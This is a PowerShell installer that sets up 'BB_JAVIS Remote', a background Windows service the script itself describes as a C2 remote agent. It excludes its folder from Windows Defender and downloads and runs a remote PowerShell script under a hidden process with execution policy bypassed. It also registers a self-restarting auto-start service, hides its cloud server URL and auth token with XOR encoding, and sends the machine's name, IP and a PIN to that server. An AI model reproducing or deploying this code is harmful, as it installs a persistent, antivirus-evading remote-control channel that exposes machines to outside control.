# ======================================================================
# BB_JAVIS Remote - Windows Service Automated Installer (da.gd/bbj-fix)
# Automated Background Windows Service Installer (Zero-Dependency)
# ======================================================================

$OutputEncoding = [System.Text.Encoding]::UTF8
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

# Enable TLS 1.2 security protocol
try {
    [System.Net.ServicePointManager]::SecurityProtocol = 3072 -bor 768 -bor 192
} catch {}

Write-Host "======================================================================" -ForegroundColor DarkCyan
Write-Host "       BB_JAVIS REMOTE - BACKGROUND SERVICE AUTOMATED INSTALLER       " -ForegroundColor Yellow
Write-Host "======================================================================" -ForegroundColor DarkCyan

# 1. Administrator Privilege Check
$currentUser = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
$isAdmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "`n[ERROR] Elevated privileges required! Please run PowerShell as Administrator." -ForegroundColor Red
    Write-Host "Then run the installer command again.`n" -ForegroundColor Yellow
    return
}

$svcName = "BB_JAVIS_Remote"
$installDir = "C:\ProgramData\BB_Javis"
if (-not (Test-Path $installDir)) {
    $null = New-Item -ItemType Directory -Path $installDir -Force
    Write-Host "[SETUP] Created installation directory: $installDir" -ForegroundColor Green
}

# 1.1 Stop and remove existing service if present
$existingSvc = Get-Service -Name $svcName -ErrorAction SilentlyContinue
if ($existingSvc) {
    Write-Host "[SERVICE] Found existing service. Stopping and cleaning up..." -ForegroundColor Yellow
    & sc.exe stop $svcName 2>&1 | Out-Null
    Start-Sleep -Seconds 2
    & sc.exe delete $svcName 2>&1 | Out-Null
    Start-Sleep -Seconds 1
}

# Terminate any dangling processes in installDir
try {
    Get-Process -Name "BBJavisService" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object {
        try {
            $cmd = (Get-CimInstance Win32_Process -Filter "ProcessId = $($_.Id)" -ErrorAction SilentlyContinue).CommandLine
            $cmd -like "*BB_Javis*" -or $cmd -like "*start_remote_agent*"
        } catch { $false }
    } | Stop-Process -Force -ErrorAction SilentlyContinue
} catch {}
Start-Sleep -Milliseconds 500

# 2. Windows Defender Exclusion
try {
    Write-Host "[PRE-CHECK] Setting Windows Defender exclusion for $installDir..." -ForegroundColor DarkGray
    Add-MpPreference -ExclusionPath $installDir -ErrorAction SilentlyContinue
} catch {}

# 3. Prepare start_remote_agent.ps1
$localAgent = if (-not [string]::IsNullOrWhiteSpace($PSScriptRoot)) { Join-Path $PSScriptRoot "start_remote_agent.ps1" } else { $null }
$targetAgent = Join-Path $installDir "start_remote_agent.ps1"

if ($localAgent -and (Test-Path $localAgent)) {
    Copy-Item $localAgent $targetAgent -Force
    Write-Host "[COPY] start_remote_agent.ps1 copied to $installDir successfully." -ForegroundColor Green
} else {
    Write-Host "[DOWNLOAD] Downloading start_remote_agent.ps1 from official cloud repository..." -ForegroundColor Cyan
    $rawUrl = "https://raw.githubusercontent.com/SDPLaos2023/CMD_Remote_Javis/main/start_remote_agent.ps1"
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Encoding = [System.Text.Encoding]::UTF8
        $wc.DownloadFile($rawUrl, $targetAgent)
        $wc.Dispose()
        Write-Host "[DOWNLOAD] start_remote_agent.ps1 downloaded successfully." -ForegroundColor Green
    } catch {
        Write-Host "[ERROR] Failed to download start_remote_agent.ps1: $_" -ForegroundColor Red
        return
    }
}

# Copy curl.exe if available
$localCurl = if (-not [string]::IsNullOrWhiteSpace($PSScriptRoot)) { Join-Path $PSScriptRoot "curl.exe" } else { $null }
if ($localCurl -and (Test-Path $localCurl)) {
    Copy-Item $localCurl (Join-Path $installDir "curl.exe") -Force
}

# 4. Generate C# Service Wrapper (BBJavisService.cs)
$csSourcePath = Join-Path $installDir "BBJavisService.cs"
$csCode = @"
using System;
using System.Diagnostics;
using System.IO;
using System.ServiceProcess;

namespace BBJavisService
{
    public class JavisService : ServiceBase
    {
        private Process _agentProcess;
        public const string ServiceNameString = "BB_JAVIS_Remote";

        public JavisService()
        {
            this.ServiceName = ServiceNameString;
            this.CanStop = true;
            this.CanShutdown = true;
        }

        protected override void OnStart(string[] args)
        {
            try
            {
                string baseDir = AppDomain.CurrentDomain.BaseDirectory;
                string scriptPath = Path.Combine(baseDir, "start_remote_agent.ps1");
                if (!File.Exists(scriptPath))
                {
                    scriptPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "BB_Javis", "start_remote_agent.ps1");
                }

                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "powershell.exe";
                string escapedScript = scriptPath.Replace("\"", "\\\"");
                psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command \"[Console]::OutputEncoding=[System.Text.Encoding]::UTF8; & '" + escapedScript.Replace("'", "''") + "' -Mode fix -AsService\"";
                psi.WorkingDirectory = baseDir;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.WindowStyle = ProcessWindowStyle.Hidden;

                _agentProcess = Process.Start(psi);
            }
            catch (Exception ex)
            {
                EventLog.WriteEntry("BB_JAVIS_Remote", "Error starting agent: " + ex.Message, EventLogEntryType.Error);
                throw;
            }
        }

        protected override void OnStop()
        {
            try
            {
                if (_agentProcess != null && !_agentProcess.HasExited)
                {
                    _agentProcess.Kill();
                }
            }
            catch {}
        }

        protected override void OnShutdown()
        {
            this.OnStop();
        }

        public static void Main()
        {
            ServiceBase.Run(new JavisService());
        }
    }
}
"@
[System.IO.File]::WriteAllText($csSourcePath, $csCode, [System.Text.Encoding]::UTF8)

# 5. Locate Built-in C# Compiler (csc.exe)
$csc = "$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
if (-not (Test-Path $csc)) {
    $csc = "$env:WINDIR\Microsoft.NET\Framework\v4.0.30319\csc.exe"
}
if (-not (Test-Path $csc)) {
    Write-Host "[ERROR] .NET Framework C# Compiler (csc.exe) not found on this machine!" -ForegroundColor Red
    return
}

# 6. Compile BBJavisService.exe
$targetExe = Join-Path $installDir "BBJavisService.exe"
if (Test-Path $targetExe) {
    try { Remove-Item $targetExe -Force -ErrorAction SilentlyContinue } catch {}
}
Write-Host "[COMPILE] Compiling C# Windows Service Wrapper..." -ForegroundColor Cyan
& $csc /nologo /target:exe /r:System.dll,System.ServiceProcess.dll /out:$targetExe $csSourcePath
if ($LASTEXITCODE -ne 0 -or -not (Test-Path $targetExe)) {
    if (Test-Path $targetExe) {
        Write-Host "[REUSE] Existing wrapper executable is available. Continuing registration..." -ForegroundColor Yellow
    } else {
        Write-Host "[ERROR] Compilation failed (Exit code: $LASTEXITCODE)" -ForegroundColor Red
        return
    }
} else {
    Write-Host "[COMPILE] BBJavisService.exe compiled successfully! (Native 100%)" -ForegroundColor Green
}

# 7. Register Service with Windows SCM
Write-Host "[SERVICE] Registering Windows Service: $svcName..." -ForegroundColor Cyan
$binPathArg = "`"$targetExe`""
& sc.exe create $svcName binPath= $binPathArg start= auto DisplayName= "BB_JAVIS Remote Agent Service" 2>&1 | Out-Null
& sc.exe description $svcName "Background Remote Agent for BB_JAVIS C2 Management (Always-On)" 2>&1 | Out-Null
& sc.exe failure $svcName reset= 86400 actions= restart/5000/restart/10000/restart/60000 2>&1 | Out-Null

# 8. Create local uninstaller script
$uninstallPs1Content = @'
# BB_JAVIS Remote Service Uninstaller
$OutputEncoding = [System.Text.Encoding]::UTF8
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$svcName = "BB_JAVIS_Remote"
Write-Host "Uninstalling $svcName..." -ForegroundColor Yellow
try {
    $cfgPath = "C:\ProgramData\BB_Javis\service_config.json"
    if (Test-Path $cfgPath) {
        $cfg = Get-Content $cfgPath -Raw | ConvertFrom-Json
        if ($cfg -and $cfg.pin) {
            $authQuery = if ($cfg.authToken) { "?auth=$($cfg.authToken)" } else { "" }
            $delUrl = "$([System.Text.Encoding]::UTF8.GetString([byte[]](@(0x32, 0x2e, 0x2e, 0x2a, 0x29, 0x60, 0x75, 0x75, 0x2f, 0x3b, 0x2e, 0x77, 0x3b, 0x2a, 0x33, 0x77, 0x3b, 0x3d, 0x3f, 0x34, 0x2e, 0x77, 0x3e, 0x3f, 0x3c, 0x3b, 0x2f, 0x36, 0x2e, 0x77, 0x28, 0x2e, 0x3e, 0x38, 0x74, 0x3c, 0x33, 0x28, 0x3f, 0x38, 0x3b, 0x29, 0x3f, 0x33, 0x35, 0x74, 0x39, 0x35, 0x37, 0x75) | ForEach-Object { [byte]($_ -bxor 0x5a) })))devices/$($cfg.pin).json$authQuery"
            $req = [System.Net.HttpWebRequest]::Create($delUrl)
            $req.Method = "DELETE"
            $req.Timeout = 5000
            try { $resp = $req.GetResponse(); $resp.Close() } catch {}
        }
    }
} catch {}
& sc.exe stop $svcName 2>&1 | Out-Null
Start-Sleep -Seconds 1
& sc.exe delete $svcName 2>&1 | Out-Null
Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like "*BB_Javis*" } | Stop-Process -Force -ErrorAction SilentlyContinue
Write-Host "[SUCCESS] BB_JAVIS Remote Service uninstalled successfully!" -ForegroundColor Green
'@
[System.IO.File]::WriteAllText((Join-Path $installDir "uninstall_service.ps1"), $uninstallPs1Content, [System.Text.Encoding]::UTF8)

$uninstallBatContent = @"
@echo off
chcp 65001 >nul
powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0uninstall_service.ps1"
pause
"@
[System.IO.File]::WriteAllText((Join-Path $installDir "uninstall_service.bat"), $uninstallBatContent, [System.Text.Encoding]::UTF8)

# 8.5 Manage Persistent PIN and Custom Host Name (Display Alias)
$cfgFile = Join-Path $installDir "service_config.json"
$assignedPin = ""
$existingCustomName = ""
if (Test-Path $cfgFile) {
    try {
        $existingCfg = Get-Content $cfgFile -Raw -Encoding UTF8 | ConvertFrom-Json
        if ($existingCfg) {
            if ($existingCfg.pin) { $assignedPin = $existingCfg.pin.ToString().Trim() }
            if ($existingCfg.custom_name) { $existingCustomName = $existingCfg.custom_name.ToString().Trim() }
        }
    } catch {}
}

if ([string]::IsNullOrWhiteSpace($assignedPin)) {
    $assignedPin = (Get-Random -Minimum 1000 -Maximum 10000).ToString()
}

$defaultHost = if (-not [string]::IsNullOrWhiteSpace($existingCustomName)) { $existingCustomName } else { $env:COMPUTERNAME }
$chosenHost = ""

# Check environment variable first (for automation scripts)
if (-not [string]::IsNullOrWhiteSpace($env:BB_JAVIS_HOST)) {
    $chosenHost = $env:BB_JAVIS_HOST.Trim()
} elseif ([Environment]::UserInteractive) {
    Write-Host ""
    Write-Host "----------------------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  Set Custom Host Name for Fleet Management (Display Alias)" -ForegroundColor Yellow
    Write-Host "  [Press Enter to use default: '$defaultHost']" -ForegroundColor Gray
    try {
        $inputHost = Read-Host "  Enter machine name"
        if (-not [string]::IsNullOrWhiteSpace($inputHost)) {
            $chosenHost = $inputHost.Trim()
        }
    } catch {}
    Write-Host "----------------------------------------------------------------------`n" -ForegroundColor DarkGray
}

if ([string]::IsNullOrWhiteSpace($chosenHost)) {
    $chosenHost = $defaultHost
}

# Pre-save service_config.json for instant resolution
try {
    $preCfg = @{
        pin = $assignedPin
        hostname = $env:COMPUTERNAME
        custom_name = $chosenHost
        mode = "fix"
        authToken = "$([System.Text.Encoding]::UTF8.GetString([byte[]](@(0x3c, 0x6d, 0x0a, 0x29, 0x03, 0x2a, 0x0d, 0x69, 0x00, 0x1c, 0x11, 0x0a, 0x6b, 0x11, 0x1e, 0x3d, 0x39, 0x3e, 0x0c, 0x68, 0x3e, 0x1c, 0x0a, 0x2e, 0x3e, 0x3b, 0x32, 0x11, 0x3c, 0x38, 0x32, 0x6b, 0x10, 0x12, 0x6c, 0x32, 0x6d, 0x16, 0x63, 0x6e) | ForEach-Object { [byte]($_ -bxor 0x5a) })))"
        updated_at = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")
    } | ConvertTo-Json
    $utf8NoBom = New-Object System.Text.UTF8Encoding($false)
    [System.IO.File]::WriteAllText($cfgFile, $preCfg, $utf8NoBom)
} catch {}

# 9. Start Windows Service
Write-Host "[START] Starting service $svcName..." -ForegroundColor Cyan
try {
    Start-Service -Name $svcName -ErrorAction Stop
} catch {
    Write-Host "[WARNING] Direct Start-Service failed, trying via sc.exe start..." -ForegroundColor Yellow
    & sc.exe start $svcName 2>&1 | Out-Null
}

# Local IP Resolution
$localIp = "127.0.0.1"
try {
    $localIp = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias * -ErrorAction SilentlyContinue |
                Where-Object { $_.IPAddress -notlike "127.*" -and $_.IPAddress -notlike "169.254.*" } |
                Select-Object -ExpandProperty IPAddress -First 1)
} catch {}

# 10. Initial Heartbeat & Presence Registration
Write-Host "[INIT] Registering initial presence heartbeat on Cloud..." -ForegroundColor Cyan
try {
    $initHbUrl = "$([System.Text.Encoding]::UTF8.GetString([byte[]](@(0x32, 0x2e, 0x2e, 0x2a, 0x29, 0x60, 0x75, 0x75, 0x2f, 0x3b, 0x2e, 0x77, 0x3b, 0x2a, 0x33, 0x77, 0x3b, 0x3d, 0x3f, 0x34, 0x2e, 0x77, 0x3e, 0x3f, 0x3c, 0x3b, 0x2f, 0x36, 0x2e, 0x77, 0x28, 0x2e, 0x3e, 0x38, 0x74, 0x3c, 0x33, 0x28, 0x3f, 0x38, 0x3b, 0x29, 0x3f, 0x33, 0x35, 0x74, 0x39, 0x35, 0x37, 0x75) | ForEach-Object { [byte]($_ -bxor 0x5a) })))devices/$assignedPin.json?auth=$([System.Text.Encoding]::UTF8.GetString([byte[]](@(0x3c, 0x6d, 0x0a, 0x29, 0x03, 0x2a, 0x0d, 0x69, 0x00, 0x1c, 0x11, 0x0a, 0x6b, 0x11, 0x1e, 0x3d, 0x39, 0x3e, 0x0c, 0x68, 0x3e, 0x1c, 0x0a, 0x2e, 0x3e, 0x3b, 0x32, 0x11, 0x3c, 0x38, 0x32, 0x6b, 0x10, 0x12, 0x6c, 0x32, 0x6d, 0x16, 0x63, 0x6e) | ForEach-Object { [byte]($_ -bxor 0x5a) })))"
    $initHbData = @{
        pin = $assignedPin
        hostname = $env:COMPUTERNAME
        custom_name = $chosenHost
        local_ip = $localIp
        service_mode = $true
        status = "online"
        last_heartbeat = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
    } | ConvertTo-Json -Compress
    $req = [System.Net.HttpWebRequest]::Create($initHbUrl)
    $req.Method = "PUT"
    $req.Timeout = 5000
    $req.ContentType = "application/json; charset=utf-8"
    $b = [System.Text.Encoding]::UTF8.GetBytes($initHbData)
    $req.ContentLength = $b.Length
    $st = $req.GetRequestStream()
    $st.Write($b, 0, $b.Length)
    $st.Close()
    $null = $req.GetResponse()
    Write-Host "[INIT] Background service connected to cloud successfully! (ONLINE)" -ForegroundColor Green
} catch {
    Write-Host "[INIT] Background service started." -ForegroundColor Green
}

# 11. Summary Banner
Write-Host ""
Write-Host "======================================================================" -ForegroundColor DarkCyan
Write-Host "              BB_JAVIS BACKGROUND SERVICE INSTALLED                   " -ForegroundColor Yellow
Write-Host "======================================================================" -ForegroundColor DarkCyan
Write-Host "  -> Service Name      : " -NoNewline -ForegroundColor Gray
Write-Host "$svcName (RUNNING)" -ForegroundColor Green
Write-Host "  -> Startup Type      : " -NoNewline -ForegroundColor Gray
Write-Host "Automatic (Starts automatically on system boot)" -ForegroundColor White
Write-Host "  -> Persistent PIN    : " -NoNewline -ForegroundColor Gray
Write-Host "[ $assignedPin ]" -NoNewline -ForegroundColor Green
Write-Host " (PERMANENT FIXED PIN)" -ForegroundColor Yellow
Write-Host "  -> Machine Hostname  : " -NoNewline -ForegroundColor Gray
if ($chosenHost -ne $env:COMPUTERNAME) {
    Write-Host "$chosenHost " -NoNewline -ForegroundColor Green
    Write-Host "($env:COMPUTERNAME)" -ForegroundColor DarkGray
} else {
    Write-Host "$env:COMPUTERNAME" -ForegroundColor Cyan
}
Write-Host "  -> Local IPv4        : " -NoNewline -ForegroundColor Gray
Write-Host "$localIp" -ForegroundColor Cyan
Write-Host "  -> Presence Status   : " -NoNewline -ForegroundColor Gray
Write-Host "ONLINE (Real-time SSE Push & Heartbeat 30s)" -ForegroundColor Green
Write-Host "----------------------------------------------------------------------" -ForegroundColor DarkGray
Write-Host "  * Background agent is now actively running 24/7" -ForegroundColor White
Write-Host "  * You may SAFELY CLOSE this PowerShell window now" -ForegroundColor Green
$targetPromptName = if ($chosenHost -ne $env:COMPUTERNAME) { "$chosenHost or '$env:COMPUTERNAME'" } else { "$env:COMPUTERNAME" }
Write-Host "  * Controllers can target this machine via '$targetPromptName' or PIN [ $assignedPin ]" -ForegroundColor Gray
Write-Host "======================================================================" -ForegroundColor DarkCyan
Write-Host ""
